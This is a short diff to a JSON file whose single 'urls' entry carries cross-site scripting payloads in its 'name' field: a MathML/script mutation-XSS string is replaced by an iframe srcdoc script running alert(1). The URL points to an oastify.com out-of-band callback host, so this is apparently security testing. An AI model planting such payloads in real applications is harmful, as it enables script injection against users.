@@ -1,7 +1,7 @@
 {
   "urls": [
     {
-      "name": "<math><mtext></mtext><script>alert(1)</script></math><iframe srcdoc="<script>alert(1)</script>">",
+      "name":"<iframe srcdoc="<script>alert(1)</script>">",
       "url": "https://ylnjpzwolptrjdjx4s4u5ft9r0xrlk99.oastify.com"
     }
   ]
